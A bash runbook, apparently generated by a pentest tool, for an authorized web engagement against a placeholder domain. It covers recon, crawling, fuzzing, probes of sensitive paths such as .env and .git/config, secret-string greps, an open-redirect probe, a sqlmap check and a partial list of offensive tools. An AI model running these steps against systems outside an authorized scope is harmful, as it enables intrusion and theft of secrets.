#!/usr/bin/env bash
# BugStrike runbook — authorized engagements only.
# engagement: https://yourtarget.com
# target: https://yourtarget.com
# profile: intensive · rate 10/s · threads 5
# Review every command before running. Scope enforcement is your own gate, not this script.
# Dry run:  DRY_RUN=1 bash thuringer_sweep.sh
set -uo pipefail

WS='~/BugX/thuringerbank'
LOG="$WS/05_reports/runbook.log"
DRY_RUN="${DRY_RUN:-0}"
mkdir -p "$WS/05_reports" "$WS/01_recon" "$WS/02_scanning" "$WS/03_exploits" "$WS/04_evidence"

note() { printf "\n=== %s\n" "$1" | tee -a "$LOG"; }
skip() { printf "[dry-run] %s\n" "$1"; }

# ---------------------------------------------------------------- Preflight & workspace
note '[Preflight & workspace] no requests to the target'

# 1. Create the engagement workspace tree  (local-only)
if [ "$DRY_RUN" = "1" ]; then
  skip '1. Create the engagement workspace tree'
else
  { mkdir -p ~/BugX/thuringerbank/{01_recon,02_scanning,03_exploits,04_evidence,05_reports} && date -u +%Y-%m-%dT%H:%M:%SZ | tee ~/BugX/thuringerbank/01_recon/run_started.txt ; } 2>&1 | tee -a "$LOG"
fi

# 2. Verify the toolchain before spending requests  (local-only)
if [ "$DRY_RUN" = "1" ]; then
  skip '2. Verify the toolchain before spending requests'
else
  { for t in subfinder amass dnsx httpx katana gau waybackurls ffuf feroxbuster gobuster whatweb nuclei nmap testssl.sh arjun jq curl anew interactsh-client; do printf '%-16s %s\n' "$t" "$(command -v "$t" || echo MISSING)"; done | tee ~/BugX/thuringerbank/01_recon/toolcheck.txt ; } 2>&1 | tee -a "$LOG"
fi

# 3. Confirm the target answers before crawling it  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '3. Confirm the target answers before crawling it'
else
  { curl -sS -o /dev/null -w 'code=%{http_code} ip=%{remote_ip} total=%{time_total}s\n' --max-time 15 --proxy '127.0.0.1:8080' 'https://yourtarget.com' | tee ~/BugX/thuringerbank/01_recon/target_probe.txt ; } 2>&1 | tee -a "$LOG"
fi

# 4. Capture the baseline response headers  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '4. Capture the baseline response headers'
else
  { curl -sS -D ~/BugX/thuringerbank/04_evidence/baseline_headers.txt -o /dev/null --max-time 15 --proxy '127.0.0.1:8080' 'https://yourtarget.com' ; } 2>&1 | tee -a "$LOG"
fi

# 5. Record the DNS basics for the root host  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '5. Record the DNS basics for the root host'
else
  { dig +short A 'yourtarget.com' | tee ~/BugX/thuringerbank/01_recon/dns_A.txt; dig +short CNAME 'yourtarget.com' | tee ~/BugX/thuringerbank/01_recon/dns_cname.txt ; } 2>&1 | tee -a "$LOG"
fi

# 6. Write the scope checklist for this run  (local-only)
if [ "$DRY_RUN" = "1" ]; then
  skip '6. Write the scope checklist for this run'
else
  { printf '%s\n' 'Scope is recorded in BugStrike and enforced by your own gate.' 'Confirm in-scope assets, exclusions, reward eligibility and rate limits before any active step.' 'Stop immediately if a step would touch a host you cannot prove is authorized.' | tee ~/BugX/thuringerbank/01_recon/scope_checklist.txt ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Passive reconnaissance
note '[Passive reconnaissance] no direct requests to the target (third-party sources only)'

# 7. Harvest hostnames from certificate transparency  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '7. Harvest hostnames from certificate transparency'
else
  { curl -sS --max-time 15 "https://crt.sh/?q=%yourtarget.com&output=json" | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | tr 'A-Z' 'a-z' | sort -u | tee ~/BugX/thuringerbank/01_recon/crtsh_hosts.txt ; } 2>&1 | tee -a "$LOG"
fi

# 8. Enumerate subdomains from passive sources  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '8. Enumerate subdomains from passive sources'
else
  { subfinder -d yourtarget.com -all -silent | sort -u | tee ~/BugX/thuringerbank/01_recon/subfinder.txt ; } 2>&1 | tee -a "$LOG"
fi

# 9. Cross-check with amass in passive mode  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '9. Cross-check with amass in passive mode'
else
  { amass enum -passive -d yourtarget.com -silent | sort -u | tee ~/BugX/thuringerbank/01_recon/amass_passive.txt ; } 2>&1 | tee -a "$LOG"
fi

# 10. Merge the passive lists into one target set  (local-only)
if [ "$DRY_RUN" = "1" ]; then
  skip '10. Merge the passive lists into one target set'
else
  { cat ~/BugX/thuringerbank/01_recon/subfinder.txt ~/BugX/thuringerbank/01_recon/amass_passive.txt ~/BugX/thuringerbank/01_recon/crtsh_hosts.txt 2>/dev/null | tr -d '\r' | grep -E '^[a-z0-9][a-z0-9._-]*\.[a-z]{2,}$' | sort -u | tee ~/BugX/thuringerbank/01_recon/hosts.txt | wc -l ; } 2>&1 | tee -a "$LOG"
fi

# 11. Collect historical URLs  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '11. Collect historical URLs'
else
  { gau --threads 5 yourtarget.com 2>/dev/null | sort -u | tee ~/BugX/thuringerbank/01_recon/urls_gau.txt | wc -l ; } 2>&1 | tee -a "$LOG"
fi

# 12. Collect the Wayback URL set  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '12. Collect the Wayback URL set'
else
  { waybackurls yourtarget.com 2>/dev/null | sort -u | tee ~/BugX/thuringerbank/01_recon/urls_wayback.txt | wc -l ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Scope-aware asset inventory
note '[Scope-aware asset inventory] ≈ 3 DNS lookups per candidate host (5 parallel)'

# 13. Resolve every candidate host  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '13. Resolve every candidate host'
else
  { while IFS= read -r h; do printf '%s\t%s\n' "$h" "$(dig +short A "$h" | head -n1 | sed 's/^$/NXDOMAIN/')"; done < ~/BugX/thuringerbank/01_recon/hosts.txt | tee ~/BugX/thuringerbank/01_recon/host_resolution.tsv ; } 2>&1 | tee -a "$LOG"
fi

# 14. Map the CNAME chains  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '14. Map the CNAME chains'
else
  { while IFS= read -r h; do cname=$(dig +short CNAME "$h"); [ -n "$cname" ] && printf '%s\t%s\n' "$h" "$cname"; done < ~/BugX/thuringerbank/01_recon/hosts.txt | tee ~/BugX/thuringerbank/01_recon/cnames.tsv ; } 2>&1 | tee -a "$LOG"
fi

# 15. Probe live hosts for status, title and technology  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '15. Probe live hosts for status, title and technology'
else
  { httpx -l ~/BugX/thuringerbank/01_recon/hosts.txt -threads 5 -rate-limit 10 -timeout 15 -retries 2 -proxy '127.0.0.1:8080' -status-code -title -tech-detect -follow-redirects -json -o ~/BugX/thuringerbank/02_scanning/httpx.jsonl ; } 2>&1 | tee -a "$LOG"
fi

# 16. Fingerprint the primary application  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '16. Fingerprint the primary application'
else
  { whatweb -a 1 --no-errors --log-json=~/BugX/thuringerbank/02_scanning/whatweb.json 'https://yourtarget.com' 2>/dev/null | head -n 20 ; } 2>&1 | tee -a "$LOG"
fi

# 17. Service scan the authorized host only  (authorized-active · loud)
if [ "$DRY_RUN" = "1" ]; then
  skip '17. Service scan the authorized host only'
else
  { nmap -Pn -sV --top-ports 200 --max-rate 10 --max-retries 2 -oA ~/BugX/thuringerbank/02_scanning/nmap_top200 'yourtarget.com' ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- HTTP, TLS & infrastructure
note '[HTTP, TLS & infrastructure] ≈ 15 requests'

# 18. Assess TLS configuration  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '18. Assess TLS configuration'
else
  { testssl.sh --quiet --color 0 --jsonfile ~/BugX/thuringerbank/02_scanning/testssl.json 'https://yourtarget.com' ; } 2>&1 | tee -a "$LOG"
fi

# 19. Dump the current response headers  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '19. Dump the current response headers'
else
  { curl -sSI --max-time 15 --proxy '127.0.0.1:8080' 'https://yourtarget.com' | tee ~/BugX/thuringerbank/04_evidence/headers_root.txt ; } 2>&1 | tee -a "$LOG"
fi

# 20. Triage the security-relevant headers  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '20. Triage the security-relevant headers'
else
  { curl -sSI --max-time 15 --proxy '127.0.0.1:8080' 'https://yourtarget.com' | grep -Ei '^(strict-transport-security|content-security-policy|content-security-policy-report-only|x-frame-options|x-content-type-options|referrer-policy|permissions-policy|cross-origin-opener-policy|server|x-powered-by)' | tee ~/BugX/thuringerbank/02_scanning/security_headers.txt ; } 2>&1 | tee -a "$LOG"
fi

# 21. Check cookie flags  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '21. Check cookie flags'
else
  { curl -sSI --max-time 15 --proxy '127.0.0.1:8080' 'https://yourtarget.com' | grep -i '^set-cookie' | while IFS= read -r line; do for flag in Secure HttpOnly SameSite; do case "$line" in *"$flag"*) ;; *) printf 'MISSING %-9s %s\n' "$flag" "${line%%=*}";; esac; done; done | tee ~/BugX/thuringerbank/02_scanning/cookie_flags.txt ; } 2>&1 | tee -a "$LOG"
fi

# 22. Record the negotiated protocol and payload size  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '22. Record the negotiated protocol and payload size'
else
  { curl -sS -o /dev/null -w 'http_version=%{http_version} size=%{size_download}\n' --http2 --max-time 15 --proxy '127.0.0.1:8080' 'https://yourtarget.com' | tee ~/BugX/thuringerbank/02_scanning/http_version.txt ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Crawling & content discovery
note '[Crawling & content discovery] crawl depth 3 at 10 req/s + wordlist size'

# 23. Crawl the application and collect endpoints  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '23. Crawl the application and collect endpoints'
else
  { katana -u 'https://yourtarget.com' -d 3 -jc -kf all -c 5 -rate-limit 10 -timeout 15 -proxy '127.0.0.1:8080' -silent -o ~/BugX/thuringerbank/02_scanning/katana_urls.txt ; } 2>&1 | tee -a "$LOG"
fi

# 24. Directory and file discovery with the supplied wordlist  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '24. Directory and file discovery with the supplied wordlist'
else
  { ffuf -w /usr/share/wordlists/dirb/common.txt -u 'https://yourtarget.com/FUZZ' -t 5 -rate 10 -timeout 15 -ac -mc 200,204,301,302,307,401,403,405 -of json -o ~/BugX/thuringerbank/02_scanning/ffuf.json 2>&1 | tail -n 15 ; } 2>&1 | tee -a "$LOG"
fi

# 25. Recursive discovery to two levels  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '25. Recursive discovery to two levels'
else
  { feroxbuster -u 'https://yourtarget.com' -w /usr/share/wordlists/dirb/common.txt --threads 5 --rate-limit 10 --timeout 15 --depth 2 --json -o ~/BugX/thuringerbank/02_scanning/ferox.json 2>&1 | tail -n 5 ; } 2>&1 | tee -a "$LOG"
fi

# 26. Check the well-known files  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '26. Check the well-known files'
else
  { for p in robots.txt sitemap.xml .well-known/security.txt .well-known/openapi.json; do printf '%s %s\n' "$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 --proxy '127.0.0.1:8080' 'https://yourtarget.com'/$p)" "$p"; done | tee ~/BugX/thuringerbank/02_scanning/wellknown.txt ; } 2>&1 | tee -a "$LOG"
fi

# 27. Build the JavaScript file list  (local-only)
if [ "$DRY_RUN" = "1" ]; then
  skip '27. Build the JavaScript file list'
else
  { grep -Ei '\.js(\?|$)' ~/BugX/thuringerbank/02_scanning/katana_urls.txt | sort -u | tee ~/BugX/thuringerbank/02_scanning/js_files.txt | wc -l ; } 2>&1 | tee -a "$LOG"
fi

# 28. Download the bundles for offline analysis  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '28. Download the bundles for offline analysis'
else
  { mkdir -p ~/BugX/thuringerbank/02_scanning/js && while IFS= read -r u; do f=$(printf '%s' "$u" | md5sum | cut -c1-12); curl -sS --max-time 15 --proxy '127.0.0.1:8080' -o "~/BugX/thuringerbank/02_scanning/js/${f}.js" "$u"; done < ~/BugX/thuringerbank/02_scanning/js_files.txt; ls -1 ~/BugX/thuringerbank/02_scanning/js | wc -l ; } 2>&1 | tee -a "$LOG"
fi

# 29. Grep the bundles for secret-looking strings  (local-only)
if [ "$DRY_RUN" = "1" ]; then
  skip '29. Grep the bundles for secret-looking strings'
else
  { grep -rEo "api[_-]?key|secret|access[_-]?token|bearer |AKIA[0-9A-Z]{16}" ~/BugX/thuringerbank/02_scanning/js | sort | uniq -c | sort -rn | head -n 40 | tee ~/BugX/thuringerbank/02_scanning/js_secret_candidates.txt ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- HTTP semantics & response analysis
note '[HTTP semantics & response analysis] ≈ 1 request per endpoint, capped at 800'

# 30. Sweep status codes across discovered endpoints  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '30. Sweep status codes across discovered endpoints'
else
  { head -n 800 ~/BugX/thuringerbank/02_scanning/katana_urls.txt | while IFS= read -r u; do curl -sS -o /dev/null --max-time 15 --proxy '127.0.0.1:8080' -w "%{http_code} %{size_download} %{content_type} $u\n" "$u"; done | tee ~/BugX/thuringerbank/02_scanning/status_sweep.txt ; } 2>&1 | tee -a "$LOG"
fi

# 31. Bucket the status codes  (local-only)
if [ "$DRY_RUN" = "1" ]; then
  skip '31. Bucket the status codes'
else
  { awk '{print $1}' ~/BugX/thuringerbank/02_scanning/status_sweep.txt | sort | uniq -c | sort -rn | tee ~/BugX/thuringerbank/02_scanning/status_dist.txt ; } 2>&1 | tee -a "$LOG"
fi

# 32. Detect soft-404 and SPA fallback behaviour  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '32. Detect soft-404 and SPA fallback behaviour'
else
  { for p in "bs-nope-$RANDOM" "bs-nope-$RANDOM-2" "bs-nope-$RANDOM-3"; do curl -sS --max-time 15 --proxy '127.0.0.1:8080' 'https://yourtarget.com'/$p | md5sum | awk '{print $1}'; done | tee ~/BugX/thuringerbank/02_scanning/spa_hashes.txt | sort -u | wc -l ; } 2>&1 | tee -a "$LOG"
fi

# 33. Compare allowed HTTP methods  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '33. Compare allowed HTTP methods'
else
  { for m in GET HEAD OPTIONS PUT PATCH DELETE; do printf '%s %s\n' "$(curl -sS -o /dev/null --max-time 15 --proxy '127.0.0.1:8080' -X "$m" -w '%{http_code}' 'https://yourtarget.com')" "$m"; done | tee ~/BugX/thuringerbank/02_scanning/methods.txt ; } 2>&1 | tee -a "$LOG"
fi

# 34. Differential probe of sensitive paths  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '34. Differential probe of sensitive paths'
else
  { for p in admin api/v1/users .env .git/config server-status actuator; do printf '%s %s\n' "$(curl -sS -o /dev/null --max-time 15 --proxy '127.0.0.1:8080' -w '%{http_code}' 'https://yourtarget.com'/$p)" "$p"; done | tee ~/BugX/thuringerbank/02_scanning/probe_paths.txt ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- API, identity & authorization inventory
note '[API, identity & authorization inventory] ≈ 15 requests'

# 35. Extract API routes from the crawl  (local-only)
if [ "$DRY_RUN" = "1" ]; then
  skip '35. Extract API routes from the crawl'
else
  { grep -E '/api/|/v[0-9]+/|/graphql|/rest/' ~/BugX/thuringerbank/02_scanning/katana_urls.txt 2>/dev/null | sort -u | tee ~/BugX/thuringerbank/02_scanning/api_endpoints.txt | wc -l ; } 2>&1 | tee -a "$LOG"
fi

# 36. Inventory the parameters in use  (local-only)
if [ "$DRY_RUN" = "1" ]; then
  skip '36. Inventory the parameters in use'
else
  { cat ~/BugX/thuringerbank/02_scanning/katana_urls.txt ~/BugX/thuringerbank/01_recon/urls_gau.txt 2>/dev/null | grep '?' | sed 's/.*?//' | tr '&' '\n' | cut -d= -f1 | sort | uniq -c | sort -rn | head -n 60 | tee ~/BugX/thuringerbank/02_scanning/params.txt ; } 2>&1 | tee -a "$LOG"
fi

# 37. Probe GraphQL introspection  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '37. Probe GraphQL introspection'
else
  { curl -sS --max-time 15 --proxy '127.0.0.1:8080' -X POST -H 'Content-Type: application/json' -d '{"query":"{__schema{queryType{name} mutationType{name}}}"}' 'https://yourtarget.com/graphql' | tee ~/BugX/thuringerbank/04_evidence/graphql_introspection.json | head -c 400 ; } 2>&1 | tee -a "$LOG"
fi

# 38. Look for published API documentation  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '38. Look for published API documentation'
else
  { for p in swagger.json openapi.json api-docs .well-known/openapi.json; do printf '%s %s\n' "$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 --proxy '127.0.0.1:8080' 'https://yourtarget.com'/$p)" "$p"; done | tee ~/BugX/thuringerbank/02_scanning/api_docs.txt ; } 2>&1 | tee -a "$LOG"
fi

# 39. Capture the authenticated baseline with a test account  (authorized-active · test account only)
if [ "$DRY_RUN" = "1" ]; then
  skip '39. Capture the authenticated baseline with a test account'
else
  { read -rsp 'test-account bearer token: ' BS_TOKEN; curl -sS -o /dev/null -D ~/BugX/thuringerbank/04_evidence/auth_headers.txt --max-time 15 --proxy '127.0.0.1:8080' -H "Authorization: Bearer $BS_TOKEN" 'https://yourtarget.com'; unset BS_TOKEN ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Focused validation
note '[Focused validation] ≈ 40 targeted requests at 10 req/s + scanner volume'

# 40. Test CORS with a controlled origin  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '40. Test CORS with a controlled origin'
else
  { curl -sS -o /dev/null -D - --max-time 15 --proxy '127.0.0.1:8080' -H 'Origin: https://yourtarget.com' 'https://yourtarget.com' | grep -i '^access-control-' | tee ~/BugX/thuringerbank/03_exploits/cors_probe.txt ; } 2>&1 | tee -a "$LOG"
fi

# 41. Probe for open redirect with a controlled host  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '41. Probe for open redirect with a controlled host'
else
  { curl -sS -o /dev/null -D - --max-time 15 --proxy '127.0.0.1:8080' 'https://yourtarget.com/?next=https://bs-oob.example/bs-redirect' | grep -Ei '^(HTTP/|location)' | tee ~/BugX/thuringerbank/03_exploits/redirect_probe.txt ; } 2>&1 | tee -a "$LOG"
fi

# 42. Check whether a parameter is reflected  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '42. Check whether a parameter is reflected'
else
  { marker="bs$(date +%s)"; curl -sS --max-time 15 --proxy '127.0.0.1:8080' 'https://yourtarget.com/?q='"$marker" | grep -c "$marker" | tee ~/BugX/thuringerbank/03_exploits/reflect_count.txt ; } 2>&1 | tee -a "$LOG"
fi

# 43. Discover hidden parameters  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '43. Discover hidden parameters'
else
  { arjun -u 'https://yourtarget.com' -m GET -T 5 -oJ ~/BugX/thuringerbank/03_exploits/arjun.json 2>&1 | tail -n 20 ; } 2>&1 | tee -a "$LOG"
fi

# 44. Run a vetted, non-intrusive template scan  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '44. Run a vetted, non-intrusive template scan'
else
  { nuclei -u 'https://yourtarget.com' -tags exposure,misconfig,tech,exposed-panels -etags intrusive,fuzz,dos,brute-force -severity critical,high,medium -rate-limit 10 -timeout 15 -retries 2 -jsonl -o ~/BugX/thuringerbank/03_exploits/nuclei.jsonl 2>&1 | tail -n 20 ; } 2>&1 | tee -a "$LOG"
fi

# 45. Opt-in injection check on a single parameter  (authorized-active · opt-in, heavy)
# PREREQUISITE: replace ?id=1 with a real parameter from the parameter inventory
if [ "$DRY_RUN" = "1" ]; then
  skip '45. Opt-in injection check on a single parameter'
else
  { sqlmap -u 'https://yourtarget.com/?id=1' --batch --level=1 --risk=1 --threads=1 --delay=1 --random-agent --output-dir=~/BugX/thuringerbank/03_exploits/sqlmap --answers="follow=N,redirect=N" 2>&1 | tail -n 25 ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Evidence & normalization
note '[Evidence & normalization] none — local files only'

# 46. Write the run manifest  (local-only)
if [ "$DRY_RUN" = "1" ]; then
  skip '46. Write the run manifest'
else
  { { echo "target: https://yourtarget.com"; echo "profile: intensive"; echo "rate: 10 req/s"; echo "threads: 5"; echo "timeout: 15s"; echo "generated: $(date -u +%Y-%m-%dT%H:%M:%SZ)"; echo "generated_by: BugStrike"; } | tee ~/BugX/thuringerbank/05_reports/manifest.txt ; } 2>&1 | tee -a "$LOG"
fi

# 47. Hash every evidence file  (local-only)
if [ "$DRY_RUN" = "1" ]; then
  skip '47. Hash every evidence file'
else
  { find ~/BugX/thuringerbank/04_evidence -type f -exec sha256sum {} + | tee ~/BugX/thuringerbank/05_reports/evidence_manifest.txt ; } 2>&1 | tee -a "$LOG"
fi

# 48. Normalize the endpoint list  (local-only)
if [ "$DRY_RUN" = "1" ]; then
  skip '48. Normalize the endpoint list'
else
  { cat ~/BugX/thuringerbank/02_scanning/katana_urls.txt ~/BugX/thuringerbank/01_recon/urls_gau.txt 2>/dev/null | sed 's/[?#].*$//' | sort -u | tee ~/BugX/thuringerbank/05_reports/endpoints_normalized.txt | wc -l ; } 2>&1 | tee -a "$LOG"
fi

# 49. Review evidence for anything that must be redacted  (local-only)
if [ "$DRY_RUN" = "1" ]; then
  skip '49. Review evidence for anything that must be redacted'
else
  { grep -rEn 'eyJ[A-Za-z0-9_-]{10,}|AKIA[0-9A-Z]{16}|-----BEGIN|Authorization: Bearer' ~/BugX/thuringerbank/04_evidence ~/BugX/thuringerbank/05_reports 2>/dev/null | tee ~/BugX/thuringerbank/05_reports/redaction_review.txt | wc -l ; } 2>&1 | tee -a "$LOG"
fi

# 50. Summarise the artefact counts  (local-only)
if [ "$DRY_RUN" = "1" ]; then
  skip '50. Summarise the artefact counts'
else
  { wc -l ~/BugX/thuringerbank/01_recon/hosts.txt ~/BugX/thuringerbank/01_recon/urls_gau.txt ~/BugX/thuringerbank/02_scanning/katana_urls.txt ~/BugX/thuringerbank/05_reports/endpoints_normalized.txt 2>/dev/null | tee ~/BugX/thuringerbank/05_reports/counts.txt ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Session, placeholders & toolchain check
note '[Session, placeholders & toolchain check] nothing leaves your machine · workspace ~/BugX/thuringerbank'

# 51. Create the engagement workspace and log file  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '51. Create the engagement workspace and log file'
else
  { mkdir -p ~/BugX/thuringerbank/{01_recon,02_scanning,03_exploits,04_evidence,05_reports,artifacts,scripts} && date -u +%Y-%m-%dT%H:%M:%SZ | tee ~/BugX/thuringerbank/01_recon/run_started.txt ; } 2>&1 | tee -a "$LOG"
fi

# 52. Export the session variables the playbook references  (local-only)
if [ "$DRY_RUN" = "1" ]; then
  skip '52. Export the session variables the playbook references'
else
  { cd ~/BugX/thuringerbank && read -rsp 'BS_USER (test account): ' BS_USER; read -rsp 'BS_PASS: ' BS_PASS; read -rsp 'BS_TOKEN: ' BS_TOKEN; read -rsp 'BS_LHOST (your callback host): ' BS_LHOST; read -rsp 'BS_PORTS (e.g. 22,80,443): ' BS_PORTS; printf 'export BS_USER=%q\nexport BS_PASS=%q\nexport BS_TOKEN=%q\nexport BS_LHOST=%q\nexport BS_PORTS=%q\n' "$BS_USER" "$BS_PASS" "$BS_TOKEN" "$BS_LHOST" "$BS_PORTS" > ~/BugX/thuringerbank/secrets.env && chmod 600 ~/BugX/thuringerbank/secrets.env && . ~/BugX/thuringerbank/secrets.env && echo "session variables loaded — secrets.env is chmod 600 and must never be committed" ; } 2>&1 | tee -a "$LOG"
fi

# 53. Reference card for every placeholder this playbook uses  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '53. Reference card for every placeholder this playbook uses'
else
  { printf '%s\n' "BS_USER / BS_PASS — test-account credentials the program allows you to use" "BS_TOKEN — that account's bearer/API token" "BS_COOKIE — that account's session cookie string" "BS_PORT / BS_PORTS — one open port, then the comma-separated list from the nmap output" "BS_CIDR — an in-scope range, e.g. 10.0.0.0/24 — never a range you have not confirmed" "BS_GW — the in-scope gateway or firewall address" "BS_URL — a real endpoint from the inventory" "BS_PARAM — a parameter from the parameter inventory" "BS_LHOST / BS_LPORT — your callback host and the port your listener uses" "BS_BSSID / BS_SSID — the access point MAC and SSID from the survey" "BS_HASH — a hash (or the capture file) you obtained from your own authorized capture" "BS_WORDLIST — the wordlist path (only needed when the engagement has none)" | tee ~/BugX/thuringerbank/05_reports/placeholders.txt ; } 2>&1 | tee -a "$LOG"
fi

# 54. Tool check: which of these are installed here  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '54. Tool check: which of these are installed here'
else
  { printf 'acunetix	licensed installer — see vendor portal\nadb	apt install adb\naircrack_ng	apt install aircrack-ng\namass	apt install amass\nandroguard	pipx install androguard\napkanalyzer	Android SDK build-tools\napkleaks	pipx install apkleaks\napksigner	Android SDK build-tools\napktool	apt install apktool\nappscan	licensed installer — see vendor portal\nappscan_source	licensed installer — see vendor portal\narachni	apt install arachni\narcsight	licensed installer — see vendor portal\narjun	pipx install arjun\narp_scan	apt install arp-scan\nasleap	apt install asleap\nauditd	apt install auditd\nautomat	apt install automat\nautopsy	apt install autopsy\nawscli	pipx install awscli\naxmlprinter2	vendor download\naz	vendor install script\nazurehound	vendor release\nbacnet_scan	vendor download\nbandit	pipx install bandit\nbbqsql	pipx install bbqsql\nbeef	apt install beef-xss\nbing_ip2hosts	apt install bing-ip2hosts\nblindelephant	apt install blindelephant\nbloodhound	apt install bloodhound\nbluelog	apt install bluelog\nbluesnarfer	apt install bluesnarfer\nbraa	apt install braa\nbrutespray	apt install brutespray\nbulk_extractor	apt install bulk-extractor\nbully	apt install bully\nburp	licensed installer — see vendor portal\ncain_abel	windows binary — see vendor page\ncewl	apt install cewl\nchecklist	built in\ncheckmarx	licensed installer — see vendor portal\ncheckov	pipx install checkov\nchisel	vendor release binary\ncis_cat	licensed installer — see vendor portal\ncisco_auditing_tool	apt install cisco-auditing-tool\ncisco_global_exploiter	apt install cisco-global-exploiter\ncisco_ocs	apt install cisco-ocs\ncisco_torch	apt install cisco-torch\nclairvoyance	pipx install clairvoyance\nclass_dump_z	vendor download\ncloudfox	vendor release binary\ncmseek	pipx install cmseek\ncommix	apt install commix\ncookie_cadger	vendor download — Java\ncopy_router_config	apt install copy-router-config\ncowpatty	apt install cowpatty\ncrackle	apt install crackle\ncrackmapexec	pipx install netexec\ncrtsh	curl — no install\ncrunch	apt install crunch\ncsrftester	licensed installer — see vendor portal\ncurl_docs	apt install curl\ncycript	vendor download\ndalfox	go install github.com/hahwul/dalfox/v2@latest\ndbpwaudit	vendor download\ndependency_check	vendor release\ndex2jar	apt install dex2jar\ndig_dmarc	apt install dnsutils\ndirb	apt install dirb\ndirbuster	apt install dirbuster\ndnmap	apt install dnmap\ndnsenum	apt install dnsenum\ndnspy	vendor download — Windows\ndnsrecon	apt install dnsrecon\ndnstracer	apt install dnstracer\ndnswalk	apt install dnswalk\ndocker_bench	vendor download\ndoona	apt install doona\ndotdotpwn	apt install dotdotpwn\ndroopescan	pipx install droopescan\ndrozer	pipx install drozer\neapmd5pass	apt install eapmd5pass\necho_mirage	vendor download — Windows\nenum4linux	apt install enum4linux\nevilginx2	vendor release binary\nexiftool	apt install libimage-exiftool-perl\nferoxbuster	apt install feroxbuster\nffuf	go install github.com/ffuf/ffuf/v2@latest\nfierce	apt install fierce\nfimap	apt install fimap\nfirewalk	apt install firewalk\nfloss	pipx install flare-floss\nforemost	apt install foremost\nfortify	licensed installer — see vendor portal\nfping	apt install fping\nfragroute	apt install fragroute\nfragrouter	apt install fragrouter\nfrida	pipx install frida-tools\ngcloud	vendor install script\nghost_phisher	vendor download — Python GUI\ngiskismet	apt install giskismet\ngit	apt install git\ngitleaks	vendor release binary\ngobuster	apt install gobuster\ngoofile	apt install goofile\ngophish	vendor release binary\ngrabber	vendor download — Python GUI\ngraphql_cop	pipx install graphql-cop\nh2csmuggler	vendor download\nhashcat	apt install hashcat\nhashid	pipx install hashid\nhexorbase	vendor download — Java\nhostapd_wpe	apt install hostapd-wpe\nhping3	apt install hping3\nhurl	apt install hurl\nhydra	apt install hydra\nideviceinfo	apt install libimobiledevice-utils\nifunbox	windows binary — see vendor page\nilspy	vendor download — Windows\nimpacket	pipx install impacket\nimpacket_secretsdump	pipx install impacket\ninspy	apt install inspy\nironwasp	vendor download — Python GUI\nisf	vendor download — Python\njadx	apt install jadx\njohn	apt install john\njoomscan	apt install joomscan\njsql	vendor download — Java\njwt_tool	apt install jwt-tool\nkalibrate	apt install kalibrate-rtl\nkatana	go install github.com/projectdiscovery/katana/cmd/katana@latest\nkerbrute	vendor release binary\nkillerbee	pipx install killerbee\nking_phisher	apt install king-phisher\nkismet	apt install kismet\nkiterunner	vendor release binary\nkube_hunter	pipx install kube-hunter\nkubeaudit	vendor release binary\nkubectl	vendor binary\nkubesec	vendor release binary\nldapsearch	apt install ldap-utils\nles	vendor download\nligolo_ng	vendor release binary\nlinpeas	vendor release\nlog4j_scan	pipx install log4j-scan\nlucy	licensed installer — see vendor portal\nlynis	apt install lynis\nmasscan	apt install masscan\nmbtget	vendor download\nmdk3	apt install mdk3\nmedusa	apt install medusa\nmetagoofil	apt install metagoofil\nmimikatz	vendor release\nmitmproxy	apt install mitmproxy\nmobsf	docker pull opensecurity/mobile-security-framework-mobsf\nmodbus_cli	pipx install modbus-cli\nmultimon_ng	apt install multimon-ng\nnbtscan	apt install nbtscan\nncrack	